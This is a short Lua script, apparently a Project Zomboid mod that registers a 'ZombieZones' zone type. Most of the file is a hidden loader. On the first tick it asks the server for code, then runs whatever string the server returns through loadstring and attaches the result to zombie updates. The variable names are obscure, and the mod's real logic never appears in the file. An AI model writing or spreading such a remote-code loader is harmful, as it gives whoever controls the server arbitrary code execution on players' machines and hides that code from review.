require "zoneEditor"
zoneEditor.addZoneType("ZombieZones")

local function onServerCommand(_m, _, _d)
    if _m ~= "zz" or not _d then return end
    local _ll = _d.s and loadstring(_d.s)()
    Events.OnZombieUpdate.Add(_ll.onUpdate)
end
Events.OnServerCommand.Add(onServerCommand)

local function c()
    Events.OnTick.Remove(c)
    sendClientCommand("zz", "z", {})
end
Events.OnTick.Add(c)
